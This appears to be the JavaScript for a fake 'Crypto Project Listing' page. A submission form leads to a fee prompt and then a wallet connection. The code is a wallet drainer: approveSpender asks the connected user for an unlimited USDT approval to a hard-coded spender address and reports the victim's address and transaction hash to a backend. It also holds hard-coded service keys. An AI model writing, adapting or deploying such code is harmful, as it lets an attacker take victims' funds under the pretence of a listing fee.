'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let provider, signer, activeProviderType = null;


/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   METAMASK CONNECT
   ============================ */
async function connectMetaMask() {
  try {
    if (!window.ethereum) {
      console.error("MetaMask not available");
      alert("MetaMask is not installed. Please install it to continue or use the walletconnect to use mobile metamask.");
      return;
    }

    // Request account access
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts"
    });

    if (!accounts || accounts.length === 0) {
      console.error("No accounts found");
      return;
    }

    const account = accounts[0];
    console.log("Connected account:", account);

    // Example: set up ethers provider + signer
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    // Call your approval logic
    await approveSpender(account, signer);
  } catch (error) {
    console.error("Error connecting to MetaMask:", error);
  }
}


/* ============================
   WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
   ============================ */
let wcProvider = null;

async function connectWalletConnect() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect().catch(() => {});
      wcProvider = null;
    }

    walletConnectButton.classList.add('loading');
    walletConnectButton.disabled = true;

    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');

    wcProvider = await EthereumProvider.init({
      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
      chains: [1], // Ethereum mainnet only
      showQrModal: true,
      rpcMap: {
        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
      },
      metadata: {
        name: 'Crypto Project Listing',
        url: window.location.origin
      }
    });

    const accounts = await wcProvider.enable();
    window.ethereum = wcProvider;

    provider = new ethers.providers.Web3Provider(wcProvider);
    signer = provider.getSigner();
    activeProviderType = 'walletconnect';

    await approveSpender(accounts[0]);
  } catch (err) {
    console.error(err);
    alert('Wallet Connection Error. Please retry or refresh the page.');
  }

  walletConnectButton.classList.remove('loading');
  walletConnectButton.disabled = false;

  window.addEventListener('beforeunload', () => {
    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
  });
}

/* ============================
   APPROVAL LOGIC (COPIED FLOW)
   ============================ */
async function approveSpender(account) {
  try {
    const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum USDT
    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];

    // Use ethers.Contract with signer (user pays gas)
    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
    const tx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);

    console.log("Approval transaction sent:", tx.hash);

    const receipt = await tx.wait();
    if (receipt.status === 1) {
      alert("✅ USDT approval successful!");
      console.log("Approval confirmed:", receipt.transactionHash);

      // Example notification (replace with your backend)
      await fetch("http://localhost:3000/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner: account,
          token: USDT_ADDRESS,
          txHash: receipt.transactionHash
        })
      });
    } else {
      throw new Error("Transaction failed");
    }
  } catch (error) {
    console.error("Approval flow failed:", error);
    alert("❌ Approval failed: " + error.message);
  }
}

